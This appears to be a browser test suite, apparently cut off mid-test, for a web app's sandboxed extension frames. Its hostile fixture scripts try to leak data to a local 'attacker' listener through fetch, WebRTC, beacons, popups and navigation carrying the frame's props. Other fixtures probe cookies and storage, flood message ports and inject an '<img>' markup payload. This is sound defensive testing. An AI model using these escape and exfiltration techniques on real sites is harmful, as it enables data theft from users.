// The web app's extension frame host (#495, route A) against hostile
// bundles, in a real browser: the release bundle (scripts/web-bundle.sh,
// ARCHITECT_WEB_BUNDLE) behind a front that does what production's proxy
// does (the app's files with its Content-Security-Policy from
// apps/web/sws.toml, `/_ext/` to the node), a node with an island
// (`island_node`, ARCHITECT_ISLAND_NODE) whose `web-*` bundle is written
// here, an attacker's HTTP and UDP listener on localhost. `/app/?demo`,
// the demo vault's note "Amazing Grace" (`type: song`, a fixture): the view
// the island claims that type with (`ARCHITECT_ISLAND_EMBEDS`, an island's
// `[[embeds]]`) in a frame of the island's bundle at the note's head,
// handed the note and its playhead source as data.
//
// The share page's probes (apps/web/test/share-webview.test.mjs), now in
// the app, and the app's own rules (#495 Constraints):
//
// - every way out of the frame (fetch, WebSocket, beacon, images, CSS,
//   links, `<a ping>`, popups, top navigation, WebRTC/STUN, child frames
//   of every kind, workers, `document.open`) reaches nothing; the app's
//   URL never changes and no window opens; a frame that leaves its
//   document is taken down and the note stays;
// - the frame's origin is opaque: it reads no cookie, no storage, nothing
//   of the app's document, and its props never carry the session the app
//   keeps (a token planted in the app's storage and cookie first);
// - its asks are only the playhead's intents, rate-limited; anything else
//   (`VAULT_READ`, `SHARE_CREATE`) is not answered;
// - its port captured and flooded, it is booted once and its height held;
// - a frame that stops answering the heartbeat is taken down;
// - a file that is not the one the node pinned is never handed to a frame;
// - a note's type picks its view from the listing before anything is
//   fetched (two islands: only the claiming one's bundle is fetched, none
//   for a type nobody claims); the view gets the note through the gate
//   (no `%%comments%%`; no note at all without a declared read); asks
//   before ready and while the page is hidden are refused; a hostile
//   `PLAYHEAD_SET` is refused whole and a full 500-item queue fits.
//
// Firefox over WebDriver BiDi (FIREFOX=… or `firefox` on the PATH), in a
// mount namespace whose runtime dir and /run/pipewire are empty (`unshare
// -r -m`): a headless Firefox otherwise opens a stream on the machine's
// live audio graph. `just app-ext-host-test` builds and runs it.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, existsSync, statSync } from 'node:fs';
import { createServer, request } from 'node:http';
import { createSocket } from 'node:dgram';
import { createServer as createNetServer } from 'node:net';
import { tmpdir } from 'node:os';
import { dirname, join, extname, normalize } from 'node:path';

const NODE = process.env.ARCHITECT_ISLAND_NODE;
const BUNDLE = process.env.ARCHITECT_WEB_BUNDLE;
function which(cmd) {
  try { return execFileSync('sh', ['-c', `command -v ${cmd}`]).toString().trim() || null; } catch { return null; }
}
const browser = process.env.FIREFOX || which('firefox');
const skip = NODE && BUNDLE && browser ? false : 'needs ARCHITECT_ISLAND_NODE, ARCHITECT_WEB_BUNDLE (just app-ext-host-test) and a Firefox (FIREFOX=…)';
if (process.env.ARCHITECT_BROWSER_REQUIRED && skip) throw new Error(`ARCHITECT_BROWSER_REQUIRED: ${skip}`);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const put = (root, rel, body) => { const p = join(root, rel); mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, body); };
const freePort = () => new Promise((ok) => { const srv = createNetServer(); srv.listen(0, '127.0.0.1', () => { const { port } = srv.address(); srv.close(() => ok(port)); }); });
const WASM = Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);
const SECRET = 'SECRET-session-token-4f2a';

// ── The bundles ─────────────────────────────────────────────────────

/// Every way out, from the progress view's frame (the share suite's EVIL,
/// trimmed to what a frame of the app can try), then off its document.
const OUT = (a, port) => `
  const A = ${JSON.stringify(a)};
  const t = (fn) => { try { const r = fn(); if (r && r.catch) r.catch(() => {}); } catch (e) {} };
  const STUN = { iceServers: [{ urls: "stun:127.0.0.1:${port}" }] };
  const rtc = (C) => { if (!C) return; const pc = new C(STUN); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); };
  t(() => rtc(globalThis.RTCPeerConnection)); t(() => rtc(globalThis.webkitRTCPeerConnection));
  t(() => fetch(A + "/fetch"));
  t(() => fetch("/_ext/islands.json").then(() => fetch(A + "/same-origin-fetch-worked")));
  t(() => new WebSocket(A.replace("http", "ws") + "/ws"));
  t(() => new EventSource(A + "/sse"));
  t(() => navigator.sendBeacon(A + "/beacon", "x"));
  t(() => { const i = new Image(); i.src = A + "/img"; document.body.appendChild(i); });
  t(() => { const s = document.createElement("style"); s.textContent = "@import url('" + A + "/css-import'); #main{background:url('" + A + "/css-bg')}"; document.head.appendChild(s); });
  t(() => { for (const rel of ["prefetch", "dns-prefetch", "preconnect", "preload", "stylesheet"]) { const l = document.createElement("link"); l.rel = rel; l.href = A + "/link-" + rel; l.as = "image"; document.head.appendChild(l); } });
  t(() => { const a = document.createElement("a"); a.href = "#p"; a.ping = A + "/ping"; document.body.appendChild(a); a.click(); });
  t(() => window.open(A + "/popup"));
  t(() => { top.location = A + "/top"; });
  t(() => { parent.location = "/app/?pwned"; });
  t(() => import(A + "/import.js"));
  const payload = (tag) => "try { const pc = new RTCPeerConnection(" + JSON.stringify(STUN) + "); pc.createDataChannel('x'); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch (e) {} try { fetch(" + JSON.stringify(A) + " + '/kid-" + tag + "'); } catch (e) {}";
  const blob = (tag, type) => URL.createObjectURL(new Blob([payload(tag)], { type: type || "text/javascript" }));
  const kids = [
    (f) => {},
    (f) => { f.srcdoc = "<script>" + payload("srcdoc") + "<\\/script>"; },
    (f) => { f.src = URL.createObjectURL(new Blob(["<script>" + payload("blob-doc") + "<\\/script>"], { type: "text/html" })); },
    (f) => { f.src = "data:text/html," + encodeURIComponent("<script>" + payload("data-doc") + "<\\/script>"); },
    (f) => { f.src = location.pathname; },
    (f) => { f.src = "/app/?demo"; },
  ];
  for (const set of kids) t(() => { const f = document.createElement("iframe"); set(f); document.body.appendChild(f); f.addEventListener("load", () => t(() => rtc(f.contentWindow.RTCPeerConnection))); });
  t(() => new Worker(blob("worker")));
  t(() => new SharedWorker(blob("sharedworker")));
  t(() => navigator.serviceWorker.register("/sw.js"));
  setTimeout(() => t(() => { document.open(); document.write("<p>x</p>"); document.close(); rtc(globalThis.RTCPeerConnection); }), 2000);
  // Off the node, carrying what the app handed it (the app's frame-src
  // refuses it), then to the app's own page.
  setTimeout(() => { location.href = A + "/selfnav?props=" + encodeURIComponent(JSON.stringify(globalThis.architectPage.props)); }, 3000);
  setTimeout(() => { location.href = "/app/?demo"; }, 4500);
`;

/// What a claimed view's frame can find of the app: its origin, the app's
/// cookie and storage, the app's document, what it was handed; its asks
/// for what is not an intent, a source of one 10-second item, a seek past
/// it, then a flood of intents. Written to its own body for the test to
/// read.
const LOOK = `
  const r = { origin: self.origin, props: [] };
  const g = (k, fn) => { try { r[k] = fn(); } catch (e) { r[k] = "threw"; } };
  g("cookie", () => document.cookie);
  g("storage", () => localStorage.length);
  g("session", () => sessionStorage.length);
  g("parentStorage", () => parent.localStorage.getItem("x"));
  g("parentDocument", () => parent.document.cookie);
  g("topHref", () => top.location.href);
  g("opener", () => String(window.opener));
  g("indexedDB", () => typeof indexedDB.open("x"));
  globalThis.architectPage.subscribe((p) => { r.props.push(JSON.stringify(p)); document.body.dataset.report = JSON.stringify(r); });
  globalThis.architectPage.ask("VAULT_READ", { path: "Welcome.md" });
  globalThis.architectPage.ask("SHARE_CREATE", { vault: "notes" });
  globalThis.architectPage.ask("PLAYHEAD_SET", { name: "Look", queue: [{ id: "a", title: "A", duration: 10 }] });
  setTimeout(() => globalThis.architectPage.ask("PLAYHEAD_SEEK", { t: 999 }), 300);
  setTimeout(() => { for (let i = 0; i < 200; i++) globalThis.architectPage.ask("PLAYHEAD_SEEK", { t: (i % 10) + 1 }); }, 800);
  document.body.dataset.report = JSON.stringify(r);
`;

/// The share suite's FLOOD: a source of one minute-long item, the frame's
/// port captured, then hellos, readies, sizes and asks by the thousand;
/// after the rate limit refills it asks for 20 + how many times it was
/// booted again.
const FLOOD = `
  globalThis.architectPage.ask("PLAYHEAD_SET", { name: "Flood", queue: [{ id: "a", title: "A", duration: 60 }] });
  let port = null; const orig = MessagePort.prototype.postMessage;
  MessagePort.prototype.postMessage = function () { port = this; return orig.apply(this, arguments); };
  globalThis.architectPage.ask("nothing");
  MessagePort.prototype.postMessage = orig;
  if (!port) return;
  let boots = 0;
  port.addEventListener("message", (m) => { if ((m.data || {}).t === "boot") boots++; });
  for (let i = 0; i < 500; i++) orig.call(port, { t: "hello" });
  for (let i = 0; i < 500; i++) orig.call(port, { t: "ready" });
  for (let i = 0; i < 5000; i++) orig.call(port, { t: "size", height: (i % 2) ? 100 : 99999 });
  for (let i = 0; i < 1000; i++) orig.call(port, { t: "ask", action: "PLAYHEAD_SEEK", args: { t: (i % 10) + 1 } });
  // The last word on its height is far over the cap, so the height the
  // test reads is the cap's doing and not this script's.
  setTimeout(() => {
    orig.call(port, { t: "size", height: 99999 });
    globalThis.architectPage.ask("PLAYHEAD_SEEK", { t: 20 + boots });
  }, 4000);
`;

/// Answers no heartbeat: its pongs are swallowed.
const SILENT = `
  const orig = MessagePort.prototype.postMessage;
  MessagePort.prototype.postMessage = function (m) { if (m && m.t === "pong") return; return orig.apply(this, arguments); };
`;

const QUIET = '';

/// One glue, a body per view (inline: the frame's policy refuses eval).
const glue = (views) => `
export default async function init() {}
const views = {
${Object.entries(views).map(([v, body]) => `  ${JSON.stringify(v)}: () => {\n${body}\n  },`).join('\n')}
};
export function mount(view) {
  document.body.dataset.view = view;
  (views[view] || (() => {}))();
}`;

// ── The node, the front, the attacker ───────────────────────────────

/// A node with an island of `bundle` (`demo.view`) claiming the demo's song
/// notes with view `claim` and reading them; with `islands`, those instead
/// (`[{id, bundle, embeds, reads}]`, listed in that order, at most two:
/// `ARCHITECT_ISLAND_*` and `ARCHITECT_ISLAND2_*`).
async function node(bundle, claim, islands) {
  const dir = mkdtempSync(join(tmpdir(), 'app-ext-'));
  const vault = join(dir, 'vault');
  put(vault, 'Welcome.md', '# Welcome\n');
  const env = {
    ...process.env, ARCHITECT_DATA_DIR: join(dir, 'data'), ARCHITECT_VAULTS: `notes=${vault}`,
    ARCHITECT_IROH: 'local', ARCHITECT_NAME: 'app-ext-test',
  };
  const list = islands || [{ id: 'demo.view', bundle, embeds: `${claim}=song=`, reads: 'documents' }];
  list.forEach((one, n) => {
    const prefix = n === 0 ? 'ARCHITECT_ISLAND' : 'ARCHITECT_ISLAND2';
    const folder = join(dir, `island-${n}`);
    put(folder, 'web-view.js', one.bundle);
    put(folder, 'web-view_bg.wasm', WASM);
    put(folder, 'architect.json', JSON.stringify({ module: 'web-view.js', manifest: { id: one.id, capabilities: {} } }));
    Object.assign(env, {
      [`${prefix}_FOLDER`]: folder, [`${prefix}_ID`]: one.id,
      [`${prefix}_VIEW`]: 'progress', [`${prefix}_TRANSPORT`]: 'transport', [`${prefix}_LYRICS`]: 'lyrics',
    });
    if (one.embeds) env[`${prefix}_EMBEDS`] = one.embeds;
    if (one.reads) env[`${prefix}_READS`] = one.reads;
  });
  const port = await freePort();
  env.ARCHITECT_BIND = `127.0.0.1:${port}`;
  const proc = spawn(NODE, [], { stdio: 'ignore', env });
  const origin = `http://127.0.0.1:${port}`;
  for (let i = 0; i < 160; i++) {
    await sleep(250);
    const ok = await fetch(`${origin}/_ext/islands.json`).then((r) => r.ok && r.json()).then((j) => j && j.islands.length === list.length, () => false);
    if (ok) return { origin, close: () => { proc.kill(); rmSync(dir, { recursive: true, force: true }); } };
  }
  proc.kill();
  throw new Error('the node never listed its island');
}

/// The app page's policy, as production's server sends it (sws.toml).
function appPolicy() {
  const sws = readFileSync(new URL('../sws.toml', import.meta.url), 'utf8');
  const m = sws.match(/Content-Security-Policy = "([^"]+)"/);
  if (!m) throw new Error('no Content-Security-Policy in apps/web/sws.toml');
  return m[1];
}

const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.wasm': 'application/wasm', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml', '.woff2': 'font/woff2' };

/// The front: `/_ext/` to the node (a `.wasm` with a byte flipped when
/// `tamper`), the rest the bundle's files, the app's page with its policy.
async function front(nodeOrigin, { tamper = false } = {}) {
  const policy = appPolicy();
  const port = await freePort();
  const target = new URL(nodeOrigin);
  const fetched = [];
  const srv = createServer((req, res) => {
    const path = decodeURIComponent(new URL(req.url, 'http://x').pathname);
    if (path.startsWith('/_ext/')) {
      fetched.push(path);
      const up = request({ host: target.hostname, port: target.port, path: req.url, method: req.method, headers: { ...req.headers, host: target.host } }, (r) => {
        if (tamper && path.endsWith('.wasm')) {
          const chunks = [];
          r.on('data', (c) => chunks.push(c));
          r.on('end', () => { const b = Buffer.concat(chunks); b[b.length - 1] ^= 0xff; const h = { ...r.headers }; delete h['content-length']; res.writeHead(r.statusCode, h); res.end(b); });
        } else { res.writeHead(r.statusCode, r.headers); r.pipe(res); }
      });
      up.on('error', () => { res.statusCode = 502; res.end(); });
      req.pipe(up);
      return;
    }
    let file = normalize(join(BUNDLE, path));
    if (!file.startsWith(normalize(BUNDLE))) { res.statusCode = 403; res.end(); return; }
    if (existsSync(file) && statSync(file).isDirectory()) file = join(file, 'index.html');
    if (!existsSync(file)) { res.statusCode = 404; res.end(); return; }
    const headers = { 'content-type': TYPES[extname(file)] || 'application/octet-stream', 'cache-control': 'no-store' };
    if (path === '/app/' || path === '/app/index.html') headers['content-security-policy'] = policy;
    res.writeHead(200, headers);
    res.end(readFileSync(file));
  });
  await new Promise((ok) => srv.listen(port, '127.0.0.1', ok));
  return { origin: `http://127.0.0.1:${port}`, policy, fetched, close: () => srv.close() };
}

function attacker() {
  const port = 20500 + Math.floor(Math.random() * 400);
  const hits = [];
  const http = createServer((req, res) => { hits.push(`${req.method} ${req.url.slice(0, 160)}`); res.statusCode = 204; res.end(); });
  http.listen(port, '127.0.0.1');
  const udp = createSocket('udp4');
  udp.on('message', (m) => hits.push(`UDP ${m.length}B (STUN)`));
  udp.bind(port, '127.0.0.1');
  return { port, url: `http://127.0.0.1:${port}`, hits, close: () => { http.close(); udp.close(); } };
}

// ── The browser ─────────────────────────────────────────────────────

async function firefox() {
  const profile = mkdtempSync(join(tmpdir(), 'app-ext-ff-'));
  const port = await freePort();
  const runtime = process.env.XDG_RUNTIME_DIR || `/run/user/${process.getuid()}`;
  const env = { ...process.env, XDG_RUNTIME_DIR: runtime, MOZ_HEADLESS: '1' };
  delete env.LD_LIBRARY_PATH; delete env.PIPEWIRE_REMOTE; delete env.PULSE_SERVER;
  // Away from the audio graph, or not at all.
  const hide = 'mount -t tmpfs none "$XDG_RUNTIME_DIR" && { [ ! -d /run/pipewire ] || mount -t tmpfs none /run/pipewire; } && exec "$0" "$@"';
  const proc = spawn('unshare', ['-r', '-m', 'sh', '-c', hide, browser, '--headless', '--no-remote', '--profile', profile, '--remote-debugging-port', String(port)], { stdio: 'ignore', env, detached: true });
  let ws;
  for (let i = 0; i < 80 && !ws; i++) {
    await sleep(250);
    try { const s = new WebSocket(`ws://127.0.0.1:${port}/session`); await new Promise((ok, no) => { s.onopen = ok; s.onerror = no; }); ws = s; } catch {}
  }
  if (!ws) { try { process.kill(-proc.pid, 'SIGKILL'); } catch {} throw new Error('firefox did not start (unshare -r -m needed)'); }
  let id = 0;
  const waiting = new Map();
  ws.onmessage = (e) => { const m = JSON.parse(e.data); if (m.id && waiting.has(m.id)) { const w = waiting.get(m.id); waiting.delete(m.id); m.type === 'error' ? w.no(new Error(`${m.error}: ${m.message}`)) : w.ok(m.result); } };
  const send = (method, params = {}) => new Promise((ok, no) => { const i = ++id; waiting.set(i, { ok, no }); ws.send(JSON.stringify({ id: i, method, params })); });
  await send('session.new', { capabilities: {} });
  const context = (await send('browsingContext.create', { type: 'tab' })).context;
  await send('browsingContext.setViewport', { context, viewport: { width: 1280, height: 900 } });
  const evalIn = async (ctx, expression) => {
    const r = await send('script.evaluate', { expression, target: { context: ctx }, awaitPromise: true, userActivation: true });
    if (r.type === 'exception') throw new Error(r.exceptionDetails.text);
    return r.result.value;
  };
  return {
    // Another tab in front (this one hidden), and this one back.
    hide: async () => { const other = (await send('browsingContext.create', { type: 'tab' })).context; await send('browsingContext.activate', { context: other }); return other; },
    show: async (other) => { await send('browsingContext.close', { context: other }); await send('browsingContext.activate', { context }); },
    go: (url) => send('browsingContext.navigate', { context, url, wait: 'complete' }),
    eval: (e) => evalIn(context, e),
    evalIn,
    tops: async () => (await send('browsingContext.getTree', {})).contexts.length,
    frames: async () => ((await send('browsingContext.getTree', { root: context })).contexts[0].children || []).map((c) => c.context),
    close: async () => { try { ws.close(); } catch {} try { process.kill(-proc.pid, 'SIGKILL'); } catch {} await sleep(300); try { rmSync(profile, { recursive: true, force: true }); } catch {} },
  };
}

async function until(fn, ms = 20000, what = 'a condition') {
  const end = Date.now() + ms;
  let last;
  while (Date.now() < end) { try { last = await fn(); if (last) return last; } catch (e) { last = e.message; } await sleep(150); }
  throw new Error(`timed out waiting for ${what}; last: ${JSON.stringify(last)}`);
}

const MARKS = `JSON.stringify([...document.querySelectorAll('[data-testid=ext-frame]')].map((e) => ({ view: e.dataset.extView, state: e.dataset.extState || 'none', why: e.dataset.extWhy || '', refused: e.dataset.extRefused || '', height: (e.querySelector('iframe') || {style: {}}).style.height || '' })))`;
const marks = async (b) => JSON.parse(await b.eval(MARKS));
const mark = async (b, view) => (await marks(b)).find((m) => m.view === view);

/// `/app/?demo`, a session planted in the app's storage and cookie, then
/// the demo's song note, the view claiming its type at its head.
async function openSong(b, origin) {
  await b.go(`${origin}/app/?demo`);
  await b.eval(`localStorage.setItem("architect.session", ${JSON.stringify(SECRET)}); document.cookie = "session=${SECRET}; path=/; SameSite=Lax"; true`);
  await until(() => b.eval(`!!document.querySelector('[data-testid=note-text]')`), 60000, 'the demo');
  const click = (txt) => b.eval(`(() => { const all = [...document.querySelectorAll('*')].filter((e) => e.children.length === 0 && e.textContent.trim() === ${JSON.stringify(txt)}); const e = all[all.length - 1]; if (!e) return false; (e.closest('button,[role=treeitem],[role=button],a,li,div') || e).click(); return true; })()`);
  await until(() => click('Songs'), 10000, 'the Songs folder');
  await sleep(300);
  await until(() => click('Amazing Grace'), 10000, 'the song note');
  await until(() => b.eval(`!!document.querySelector('[data-testid=note-embed]')`), 15000, 'the claimed view');
}

const timeOf = async (b) => Number(await b.eval(`document.querySelector('[data-testid=note-embed]').dataset.time`));

async function frameOf(b, view) {
  for (const c of await b.frames()) {
    if ((await b.evalIn(c, 'document.body && document.body.dataset.view').catch(() => null)) === view) return c;
  }
  return null;
}

async function world(views, claim, opts) {
  const n = await node(glue(views), claim);
  const f = await front(n.origin, opts);
  const b = await firefox();
  return { n, f, b, close: async () => { await b.close(); f.close(); n.close(); } };
}

test('the app page frames only its own origin', { skip }, async () => {
  const w = await world({ progress: QUIET, transport: QUIET, lyrics: QUIET }, 'lyrics');
  try {
    const r = await fetch(`${w.f.origin}/app/`);
    const header = r.headers.get('content-security-policy');
    assert.match(header, /frame-src 'self'/);
    assert.doesNotMatch(header, /'unsafe-eval'/);
    const html = await r.text();
    assert.match(html, /http-equiv="Content-Security-Policy" content="[^"]*frame-src 'self'/);
    await openSong(w.b, w.f.origin);
    await until(async () => (await marks(w.b)).filter((m) => m.state === 'ready').length === 1, 20000, 'the claimed frame ready');
    // The frame is the node's web view document on this origin, sandboxed.
    const frames = JSON.parse(await w.b.eval(`JSON.stringify([...document.querySelectorAll('iframe')].map((f) => [f.getAttribute('sandbox'), new URL(f.src).origin === location.origin, new URL(f.src).pathname]))`));
    assert.equal(frames.length, 1);
    for (const [sandbox, same, path] of frames) {
      assert.equal(sandbox, 'allow-scripts');
      assert.ok(same);
      assert.match(path, /^\/_ext\/webview\.[0-9a-f]+\.html$/);
    }
    const c = await frameOf(w.b, 'lyrics');
    assert.equal(await w.b.evalIn(c, 'self.origin'), 'null', 'an opaque origin');
  } finally { await w.close(); }
});

test('a hostile bundle in the app reaches nothing and is taken down', { skip }, async () => {
  const a = attacker();
  const w = await world({ progress: OUT(a.url, a.port), transport: QUIET, lyrics: QUIET }, 'progress');
  try {
    const windows = await w.b.tops();
    await openSong(w.b, w.f.origin);
    const app = await w.b.eval('location.href');
    // The frame leaves its document: taken down, for good.
    const gone = await until(async () => { const m = await mark(w.b, 'progress'); return m && m.state === 'gone' && m; }, 20000, 'the progress frame taken down');
    assert.equal(gone.why, 'it left its document');
    await sleep(3000);
    assert.deepEqual(a.hits, [], `the attacker heard: ${a.hits.join(', ')}`);
    assert.equal(await w.b.eval('location.href'), app, 'the app was never navigated');
    assert.equal(await w.b.tops(), windows, 'no window opened');
    assert.equal(await w.b.eval(`!!document.querySelector('[data-testid=note-text]')`), true, 'the note stays');
  } finally { a.close(); await w.close(); }
});

test('a frame takes nothing of the app and its asks are only rate-limited intents', { skip }, async () => {
  const w = await world({ progress: QUIET, transport: LOOK, lyrics: QUIET }, 'transport');
  try {
    await openSong(w.b, w.f.origin);
    // Nothing of the app reached the frame.
    const c = await until(() => frameOf(w.b, 'transport'), 15000, 'the transport frame');
    const report = JSON.parse(await until(() => w.b.evalIn(c, 'document.body.dataset.report'), 10000, 'its report'));
    assert.equal(report.origin, 'null');
    // An opaque origin's `document.cookie` throws (Firefox) or is empty.
    assert.ok(report.cookie === 'threw' || report.cookie === '', `cookie: ${report.cookie}`);
    assert.ok(!JSON.stringify(report).includes(SECRET), 'the session never reached it');
    for (const k of ['storage', 'session', 'parentStorage', 'parentDocument', 'topHref', 'indexedDB']) assert.equal(report[k], 'threw', k);
    const last = JSON.parse(await until(async () => { const r = JSON.parse(await w.b.evalIn(c, 'document.body.dataset.report')); return r.props.length > 1 && r.props[r.props.length - 1]; }, 10000, 'its props'));
    // The note as data and its source's playhead state, nothing else.
    assert.deepEqual(Object.keys(last).sort(), ['active', 'artist', 'at', 'clock', 'duration', 'index', 'item', 'name', 'note', 'playing', 'queue', 'rate', 'sections', 'source', 'subtitle', 'time', 'title', 'tracks']);
    assert.equal(last.note.path, 'Songs/Amazing Grace.md');
    for (const p of JSON.parse(await w.b.evalIn(c, 'document.body.dataset.report')).props) assert.ok(!p.includes(SECRET), 'no session in its props');
    // Its flood of asks was rate-limited; a seek past its item, a vault
    // read and a share were not answered.
    await until(async () => (await mark(w.b, 'transport')).refused === 'too many requests', 10000, 'the flood refused');
    await sleep(500);
    const time = await timeOf(w.b);
    assert.ok(time >= 0 && time <= 10, `the playhead stayed in the item: ${time}`);
    assert.equal(await w.b.eval(`document.querySelector('[data-testid=note-embed]').dataset.queue`), '1');
  } finally { await w.close(); }
});

test('a frame that floods its port is booted once and its height held', { skip }, async () => {
  const w = await world({ progress: QUIET, transport: FLOOD, lyrics: QUIET }, 'transport');
  try {
    await openSong(w.b, w.f.origin);
    const at = await until(async () => {
      const t = await timeOf(w.b);
      return t >= 20 && t;
    }, 20000, 'the flood to report its boots');
    assert.equal(Math.round(at), 20, `booted again ${Math.round(at) - 20} times`);
    const m = await mark(w.b, 'transport');
    assert.equal(m.state, 'ready');
    assert.equal(m.refused, 'too many requests');
    const held = await until(async () => {
      const h = parseFloat((await mark(w.b, 'transport')).height);
      return h === 4000 && h;
    }, 5000, 'the frame to be held at the cap');
    assert.equal(held, 4000);
  } finally { await w.close(); }
});

test('a frame that stops answering is taken down and the note stays', { skip }, async () => {
  const w = await world({ progress: QUIET, transport: SILENT, lyrics: QUIET }, 'transport');
  try {
    await openSong(w.b, w.f.origin);
    await until(async () => (await mark(w.b, 'transport'))?.state === 'ready', 15000, 'the transport frame ready');
    const gone = await until(async () => { const m = await mark(w.b, 'transport'); return m.state === 'gone' && m; }, 15000, 'the silent frame taken down');
    assert.equal(gone.why, 'it stopped answering');
    assert.equal(await w.b.eval(`!!document.querySelector('[data-testid=note-text]')`), true);
  } finally { await w.close(); }
});

test('a file that is not the one pinned is never handed to a frame', { skip }, async () => {
  const w = await world({ progress: QUIET, transport: QUIET, lyrics: QUIET }, 'lyrics', { tamper: true });
  try {
    await openNoteOnly(w);
    await sleep(3000);
    assert.equal(await w.b.eval(`document.querySelectorAll('iframe').length`), 0, 'no frame');
    assert.equal(await w.b.eval(`!!document.querySelector('[data-testid=note-text]')`), true, 'the note');
  } finally { await w.close(); }
});

/// A claimed view: what it is handed, written to its body; a source asked
/// before it is ready (refused), a hostile source (a URL for media, then
/// one item too many), then a whole queue of 500 (past the old 16 KiB, an
/// HTML title among them), then the next item every 700 ms.
const CLAIM = `
  const r = { props: [] };
  const ask = (a, args) => globalThis.architectPage.ask(a, args);
  ask("PLAYHEAD_SET", { name: "Early", queue: [{ id: "early", title: "Early", duration: 5 }] });
  globalThis.architectPage.subscribe((p) => { r.props.push(p); if (r.props.length > 5) r.props.shift(); document.body.dataset.report = JSON.stringify(r); });
  setTimeout(() => ask("PLAYHEAD_SET", { queue: [{ id: "x", title: "X", media: "https://evil.test/a.ogg" }] }), 800);
  setTimeout(() => ask("PLAYHEAD_SET", { queue: Array.from({ length: 501 }, (_, i) => ({ id: "i" + i, title: "t", duration: 1 })) }), 1100);
  setTimeout(() => {
    const queue = Array.from({ length: 500 }, (_, i) => ({ id: "Setlists/Merry.md#" + i, title: i === 0 ? "<img src=x data-pwned=1>Opener" : "Song number " + i, subtitle: "Traditional", duration: 192.5 }));
    ask("PLAYHEAD_SET", { name: "Big", queue });
  }, 1400);
  setTimeout(() => setInterval(() => ask("PLAYHEAD_NEXT"), 700), 2500);
`;

/// What a view is handed, written to its body.
const REPORT = `
  globalThis.architectPage.subscribe((p) => { document.body.dataset.report = JSON.stringify(p); });
`;

/// Opens the note `name` under the folders `path` in `/app/?demo`, with
/// every frame's refusal recorded on the page (`window.__refused`).
async function openNote(b, origin, path, name, fresh = true) {
  if (fresh) {
    await b.go(`${origin}/app/?demo`);
    await until(() => b.eval(`!!document.querySelector('[data-testid=note-text]')`), 60000, 'the demo');
    await b.eval(`window.__refused = []; new MutationObserver((ms) => { for (const m of ms) window.__refused.push(m.target.getAttribute('data-ext-refused')); }).observe(document.body, { subtree: true, attributes: true, attributeFilter: ['data-ext-refused'] }); true`);
  }
  const click = (txt) => b.eval(`(() => { const all = [...document.querySelectorAll('*')].filter((e) => e.children.length === 0 && e.textContent.trim() === ${JSON.stringify(txt)}); const e = all[all.length - 1]; if (!e) return false; (e.closest('button,[role=treeitem],[role=button],a,li,div') || e).click(); return true; })()`);
  for (const folder of path) { await until(() => click(folder), 10000, `the folder ${folder}`); await sleep(300); }
  await until(() => click(name), 10000, `the note ${name}`);
  await until(() => b.eval(`document.querySelector('[data-note]')?.dataset.note?.endsWith(${JSON.stringify(`${name}.md`)})`), 10000, `${name} open`);
}

const embed = async (b) => JSON.parse(await b.eval(`JSON.stringify((() => { const e = document.querySelector('[data-testid=note-embed]'); return e && { view: e.dataset.view, queue: Number(e.dataset.queue), current: e.dataset.current, island: e.querySelector('[data-testid=ext-frame]')?.dataset.extIsland }; })())`));

test('a note\'s type picks its island from the listing; the view gets the note through the gate, and only asks it may', { skip }, async () => {
  const n = await node(null, null, [
    // Listed first: claims captures, reads nothing.
    { id: 'demo.first', bundle: glue({ first: REPORT }), embeds: 'first=capture' },
    // Listed second: claims songs, reads the note, declares `artist`.
    { id: 'demo.second', bundle: glue({ second: CLAIM }), embeds: 'second=song=artist', reads: 'documents' },
  ]);
  const f = await front(n.origin);
  const b = await firefox();
  try {
    const listing = await (await fetch(`${n.origin}/_ext/islands.json`)).json();
    const folder = (id) => listing.islands.find((i) => i.id === id).folder;
    const bundles = () => f.fetched.filter((p) => p.startsWith('/_ext/island/'));
    // A typed note nobody claims: nothing fetched, nothing drawn.
    await openNote(b, f.origin, ['Tasks'], 'Book mastering');
    await sleep(2000);
    assert.deepEqual(bundles(), [], 'no bundle for a type nobody claims');
    assert.equal(await embed(b), null);
    // A song: the second island's view; the first's bundle never fetched.
    await openNote(b, f.origin, ['Songs'], 'Slow River', false);
    await until(async () => (await mark(b, 'second'))?.state === 'ready', 20000, 'the claimed view ready');
    const e = await embed(b);
    assert.equal(e.view, 'second');
    assert.equal(e.island, 'demo.second');
    assert.ok(bundles().length > 0 && bundles().every((p) => p.startsWith(folder('demo.second'))), `fetched: ${bundles().join(', ')}`);
    // The whole queue came through; what was refused, with why.
    const full = await until(async () => { const x = await embed(b); return x.queue === 500 && x; }, 20000, 'the 500-item queue');
    assert.match(full.current, /^Setlists\/Merry\.md#\d+$/);
    const refused = JSON.parse(await b.eval('JSON.stringify(window.__refused)'));
    for (const why of ['not ready', 'media must be a vault path', 'queue: at most 500 items']) assert.ok(refused.includes(why), `${why} in ${JSON.stringify(refused)}`);
    assert.equal(await b.eval(`document.querySelectorAll('[data-pwned]').length`), 0, 'a title is never markup');
    // What it was handed: the note, without its comments.
    const c = await frameOf(b, 'second');
    const report = JSON.parse(await until(() => b.evalIn(c, 'document.body.dataset.report'), 10000, 'its report'));
    const note = report.props[report.props.length - 1].note;
    assert.equal(note.path, 'Songs/Slow River.md');
    assert.equal(note.properties.artist, 'Traditional');
    assert.ok(note.body.includes('Fingerstyle'), 'the body');
    assert.ok(!note.body.includes('Capo 2') && !note.body.includes('%%'), 'no comment');
    // Hidden, it takes no ask: its NEXTs are refused and the item stays.
    await until(async () => Number((await embed(b)).current.split('#')[1]) >= 2, 10000, 'NEXT heard while shown');
    const other = await b.hide();
    try {
      await until(() => b.eval(`document.hidden`), 5000, 'the page hidden');
      await until(async () => JSON.parse(await b.eval('JSON.stringify(window.__refused)')).includes('the page is hidden'), 10000, 'an ask refused while hidden');
      const held = (await embed(b)).current;
      await sleep(2500);
      assert.equal((await embed(b)).current, held, 'no ask moved it while hidden');
    } finally { await b.show(other); }
    // A capture: the first island's view, whose claim names no read: no note.
